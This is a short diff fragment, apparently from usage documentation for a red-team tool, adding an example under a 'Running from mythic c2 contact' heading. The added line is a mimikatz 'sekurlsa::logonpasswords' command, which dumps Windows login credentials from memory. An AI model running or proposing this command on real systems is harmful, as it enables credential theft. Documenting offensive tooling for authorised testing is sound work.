@@ -6,3 +6,6 @@ Running from binary context
 ```
 
 Running from mythic c2 contact
+```
+mimikatz "sekurlsa::logonpasswords"
+```
